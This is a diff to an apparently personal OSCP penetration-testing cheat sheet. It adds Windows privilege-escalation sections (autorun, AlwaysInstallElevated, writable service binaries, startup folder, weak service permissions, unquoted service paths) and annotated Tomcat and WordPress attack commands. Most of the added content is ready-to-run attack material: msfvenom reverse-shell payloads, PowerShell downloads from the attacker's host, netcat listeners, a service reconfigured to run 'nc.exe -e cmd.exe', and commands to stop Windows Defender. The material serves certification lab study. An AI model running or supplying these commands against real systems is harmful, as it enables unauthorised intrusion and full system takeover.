@@ -157,6 +157,24 @@ description: "OSCP personal cheat sheet"
       - [Post exploitation](#post-exploitation)
     + [JuicyPotato (SeImpersonate or SeAssignPrimaryToken)](#juicypotato--seimpersonate-or-seassignprimarytoken-)
   * [Methodology to follow](#methodology-to-follow-1)
+  * [Autorun](#autorun)
+    + [Detection](#detection)
+    + [Exploitation](#exploitation)
+  * [AlwaysInstallElevated](#alwaysinstallelevated)
+    + [Detection](#detection-1)
+    + [Exploitation](#exploitation-1)
+  * [Executable Files](#executable-files)
+    + [Detection](#detection-2)
+    + [Exploitation](#exploitation-2)
+  * [Startup applications](#startup-applications)
+    + [Detection](#detection-3)
+    + [Exploitation](#exploitation-3)
+  * [Weak service permission](#weak-service-permission)
+    + [Detection](#detection-4)
+    + [Exploitation](#exploitation-4)
+  * [Unquoted service paths](#unquoted-service-paths)
+    + [Detection](#detection-5)
+    + [Exploitation](#exploitation-5)
     + [CVE](#cve)
       - [Windows XP](#windows-xp)
       - [Windows 7](#windows-7)
@@ -326,7 +344,10 @@ python crawleet.py -u <URL> -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --thre
 ### Wordpress
 
 ```
+# Scan
 wpscan --rua -e --url <URL>
+
+# Brute force user(s)
 wpscan --rua --url <URL> -P <PASSWORDS_LIST> -U "<USER>,<USER>"
 ```
 
@@ -416,15 +437,20 @@ hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV
 #### Tomcat panel RCE
 
 ```
+# Generate payload
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
 
+# Upload payload
 Tomcat6 :
 wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
 
 Tomcat7 and above :
 wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/text/deploy?war=file:shell.war&path=/shell' -O -
 
+# Listener
 nc -lvp <PORT>
+
+# Execute payload
 wget http://<IP>:8080/shell
 ```
 
@@ -1407,17 +1433,258 @@ https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
 http://www.fuzzysecurity.com/tutorials/16.html
 ```
 
+### Autorun
+
+#### Detection
+
 ```
-Kernel Exploits 
-OS Exploits 
-Pass The Hash 
-Password reuse 
-DLL hijacking (Path) 
-Vulnerable services 
-Writable services binaries path 
-Unquoted services 
-Listening ports on localhost 
-Registry keys
+powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking for modifiable registry autoruns and configs...
+
+Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
+Path           : "C:\Program Files\Autorun Program\program.exe"
+ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}
+```
+
+or
+
+```
+winPEAS.exe
+
+[+] Autorun Applications(T1010)
+    Folder: C:\Program Files\Autorun Program
+    File: C:\Program Files\Autorun Program\program.exe
+    FilePerms: Everyone [AllAccess]
+```
+
+#### Exploitation
+
+```
+# Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+cd C:\Program Files\Autorun Program\
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
+
+To execute it with elevated privileges we need to wait for someone in the Admin group to login.
+```
+
+### AlwaysInstallElevated
+
+#### Detection
+
+```
+powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+AbuseFunction : Write-UserAddMSI
+```
+
+or
+
+```
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+If both values are equal to 1 then it's vulnerable.
+```
+
+or
+
+```
+winPEAS.exe
+
+[+] Checking AlwaysInstallElevated(T1012)
+
+  AlwaysInstallElevated set to 1 in HKLM!
+  AlwaysInstallElevated set to 1 in HKCU!
+```
+
+#### Exploitation
+
+```
+# Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > program.msi
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.msi', 'C:\Temp\program.msi')
+msiexec /quiet /qn /i C:\Temp\program.msi
+```
+
+### Executable Files
+
+#### Detection
+
+```
+powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking service executable and argument permissions...
+
+ServiceName                     : filepermsvc
+Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
+ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
+ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
+ModifiableFileIdentityReference : Everyone
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
+CanRestart                      : True
+```
+
+or
+
+```
+winPEAS.exe
+
+[+] Interesting Services -non Microsoft-(T1007)
+
+filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
+	File Permissions: Everyone [AllAccess]
+```
+
+#### Exploitation
+
+```
+# Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', 'C:\Temp\program.exe')
+copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+sc start filepermsvc
+```
+
+### Startup applications
+
+#### Detection
+
+```
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
+                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
+                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
+                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
+                                                             Everyone:(I)(OI)(CI)(RX)
+
+If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
+```
+
+#### Exploitation
+
+```
+# Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', ".\program.exe')
+
+To execute it with elevated privileges we need to wait for someone in the Admin group to login.
+```
+
+### Weak service permission 
+
+#### Detection
+
+```
+powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking service permissions...
+
+ServiceName   : daclsvc
+Path          : "C:\Program Files\DACL Service\daclservice.exe"
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
+CanRestart    : True
+```
+
+or
+
+```
+winPEAS.exe
+
+[+] Interesting Services -non Microsoft-(T1007)
+
+daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
+	YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
+
+[+] Modifiable Services(T1007)
+	LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
+	daclsvc: WriteData/CreateFiles
+```
+
+#### Exploitation
+
+```
+# Attacker
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
+sc config daclsvc binpath= "C:\Users\User\nc.exe <IP> <PORT> -e cmd.exe"
+sc start daclsvc
+```
+
+### Unquoted service paths
+
+#### Detection
+
+```
+powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking for unquoted service paths...
+
+ServiceName    : unquotedsvc
+Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
+CanRestart     : True
+
+ServiceName    : unquotedsvc
+Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
+CanRestart     : True
+```
+
+or
+
+```
+winPEAS.exe
+
+[+] Interesting Services -non Microsoft-(T1007)
+
+unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
+```
+
+#### Exploitation
+
+```
+# Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Common.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+cd "C:\Program Files\Unquoted Path Service\"
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', ".\Common.exe')
+sc start unquotedsvc
 ```
 
 #### CVE
@@ -1647,6 +1914,12 @@ reg query HKCU /f password /t REG_SZ /s
 
 # Disable windows defender
 sc stop WinDefend
+
+# Bypass restriction
+powershell -nop -ep bypass
+
+# List hidden files
+dir /a
 ```
 
 ------
